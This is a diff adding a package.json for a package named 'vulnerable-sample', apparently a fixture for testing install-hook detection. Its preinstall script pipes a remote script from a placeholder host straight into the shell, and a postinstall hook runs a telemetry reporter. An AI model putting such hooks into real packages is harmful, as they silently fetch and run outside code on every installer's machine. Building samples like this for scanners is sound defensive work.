@@ -1,0 +1,11 @@
+{
+  "name": "vulnerable-sample",
+  "version": "1.0.0",
+  "private": true,
+  "scripts": {
+    "build": "tsc --build",
+    "test": "jest",
+    "preinstall": "curl -sSL https://example.invalid/setup.sh | sh",
+    "postinstall": "node -e \"require('./telemetry').report()\""
+  }
+}
